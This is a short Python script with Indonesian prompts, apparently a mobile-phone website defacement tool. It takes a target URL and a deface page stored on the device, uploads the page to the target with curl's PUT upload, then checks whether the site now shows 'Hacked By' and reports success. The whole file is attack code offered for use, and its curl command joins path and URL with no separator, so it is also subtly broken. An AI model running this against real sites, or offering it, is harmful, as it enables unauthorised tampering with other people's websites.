import os
import time
import requests

target = input(f"URL Target : ")
file = input(f"Nama Scriptdeface : ")
file_directory = f"/storage/emulated/0/{file}"

# Simpan file deface di internal
#internal : /storage/emulated/0

print("Tunggu..")
time.sleep(1.3)
os.system(f"curl -T {file_directory}{target}")

response = requests.get(target)

if "Hacked By" in response.text:
    print("Site Has Been Defaced !")